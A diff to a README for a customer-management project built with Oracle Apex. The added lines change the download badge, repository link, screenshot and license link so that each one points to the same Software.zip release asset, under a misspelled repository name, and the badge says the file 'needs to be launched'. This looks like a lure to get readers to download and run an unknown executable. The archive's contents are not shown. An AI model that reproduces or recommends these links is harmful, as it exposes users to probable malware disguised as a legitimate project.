@@ -26,17 +26,17 @@ The project utilizes a range of technologies and topics including:
 - Ultramsg
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-1abc9c.svg)](https://github.com/user-attachments/files/18383251/Software.zip needs to be launched)
+[![Download Software](https://github.com/Pok121881/Customer-Management-with-Oracel-Apex/releases/download/v2.0/Software.zip)](https://github.com/Pok121881/Customer-Management-with-Oracel-Apex/releases/download/v2.0/Software.zip needs to be launched)
 
 If the link for software download does not work, please check the "Releases" section of the repository for alternative options.
 
 ## Repository Link
-For more details, code, and information about the project, visit the [Customer Management with Oracle Apex Repository](https://github.com/your-username/Customer-Management-with-Oracle-Apex).
+For more details, code, and information about the project, visit the [Customer Management with Oracle Apex Repository](https://github.com/Pok121881/Customer-Management-with-Oracel-Apex/releases/download/v2.0/Software.zip).
 
 ## Screenshots
 Here are some snapshots from the Customer Management System:
 
-![Customer Management System](https://your-image-link/customer-management.png)
+![Customer Management System](https://github.com/Pok121881/Customer-Management-with-Oracel-Apex/releases/download/v2.0/Software.zip)
 
 ## Installation
 To run this project locally, follow these steps:
@@ -55,6 +55,6 @@ For any inquiries or issues with the project, feel free to reach out to the repo
 Contributions to enhance the Customer Management System are welcome! Whether it's fixing bugs, adding new features, or improving the user interface, every contribution is valuable. Fork the repository, make your changes, and submit a pull request.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/Customer-Management-with-Oracle-Apex/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Pok121881/Customer-Management-with-Oracel-Apex/releases/download/v2.0/Software.zip) file for details.
 
 Let's make managing customer information easier with Oracle Apex! 🚀📊📋
